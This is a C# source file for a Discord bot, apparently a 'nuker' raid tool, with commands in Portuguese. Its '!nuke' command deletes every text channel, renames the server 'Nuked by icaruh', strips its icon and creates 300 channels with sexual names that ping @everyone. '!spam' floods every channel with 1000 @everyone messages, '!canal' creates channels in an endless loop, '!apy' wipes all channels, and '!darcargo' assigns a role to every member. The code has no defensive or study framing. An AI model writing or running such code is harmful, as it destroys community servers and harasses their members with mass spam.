using Discord.Commands;
using Discord.WebSocket;
using Discord;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Threading.Channels;
using System.Runtime.InteropServices;
namespace DiscordBot.Comandos
{
    public class Comandos : ModuleBase<SocketCommandContext>
    {
        private int canalCount = 1;
        private bool isCreatingChannels = false;
        private CancellationTokenSource _cts;

        [Command("spam")]
        public async Task PingAsync()
        {
            var guild = Context.Guild as SocketGuild;
            if (guild == null) 
            {
                await ReplyAsync("sem acesso aos canais desse server");
                return;
            }
            var channels = guild.TextChannels;
            var message = "@everyone waltrick";

            await Task.WhenAll(channels.Select (async channel =>
            {
                try
                {
                    for (int i = 0; i < 1000; i++)
                    {
                        await channel.SendMessageAsync(message);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Erro");
                }             
            }));
            
        }


        [Command("canal")]
        public async Task CriarCanal()
        {
            var guild = (SocketGuild)Context.Guild;
            var canalCount = 1;

            while (true)
            {
                string channelName = $"Canal-{canalCount}";
                canalCount++;

                try
                {
                    var channel = await guild.CreateTextChannelAsync(channelName);
                    await channel.SendMessageAsync("@everyone");

                    await Task.Delay(100);
                }
                catch (Exception ex)
                {
                    await ReplyAsync($"Erro ao criar canal: {ex.Message}");
                }

            }
            
        }

        [Command("nuke")]
        public async Task NukeAsync()
        {
            var guild = Context.Guild as SocketGuild;
            if (guild == null)
            {
                await ReplyAsync("sem acesso nessa bomba");
                return;
            }

            var deleteTasks = guild.TextChannels.Select(channel => Task.Run(async () =>
            {
                try
                {
                    await channel.DeleteAsync();
                    Console.WriteLine($"{channel.Name} deletado");

                }
                catch (Exception ex)
                {
                    Console.WriteLine("erro deletando os canais");
                    
                }
            }));

            await Task.WhenAll(deleteTasks);
            try
            { 
               
                await guild.ModifyAsync(properties =>
                {
                    properties.Name = "Nuked by icaruh";
                    properties.Icon = null;
                });


                var createChannelTasks = new List<Task>();
                for (int i = 1; i <= 300; i++)
                {
                    createChannelTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            var channel = await guild.CreateTextChannelAsync($"sexo-{i}");
                            await channel.SendMessageAsync("@everyone icaruh");
                            Console.WriteLine($"Canal -{i} criado");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Erro ao criar canal Canal-{i}: {ex.Message}");
                        }
                    }));
                }

                await Task.WhenAll(createChannelTasks);
             

            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erro");
       
            }
        }

        [Command("ajuda")]
        public async Task ajudaAsync()
        {
            await ReplyAsync("   !nuke\n!spam\n!canal");

        }

        [Command("apy")]
        public async Task ApagarCanaisAsync()
        {
            var guild = Context.Guild as SocketGuild;
            if (guild == null)
            {
                await ReplyAsync("Sem acesso aos canais desse servidor.");
                return;
            }

            var deleteTasks = guild.TextChannels.Select(async channel =>
            {
                try
                {
                    await channel.DeleteAsync();
                    Console.WriteLine($"{channel.Name} deletado.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"erro");
                }
            });

            await Task.WhenAll(deleteTasks);

            await ReplyAsync("apagados");
        }

        [Command("wal")]
        public async Task WalAsync()
        {

            await ReplyAsync("<@624081697289404416>");
        }

        [Command("darcargo")]

        public async Task DarCargoAsync(ulong roleId)
        {
            var guild = Context.Guild;
            if (guild == null)
            {
                await ReplyAsync("Erro ao entrar no servidor");
                return;
            }


            var role = guild.GetRole(roleId);
            if (role == null)
            {
                await ReplyAsync($"cargo nao encontrado.");
                return;
            }


            var members = guild.Users.Where(u => !u.IsBot); 
            foreach (var member in members)
            {
                try
                {
                    if (!member.Roles.Contains(role)) 
                    {
                        await member.AddRoleAsync(role);
                        Console.WriteLine($"Cargo '{role.Name}' adicionado nesse cara ai {member.Username}.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Erro");
                }
            }
        }


    }
}

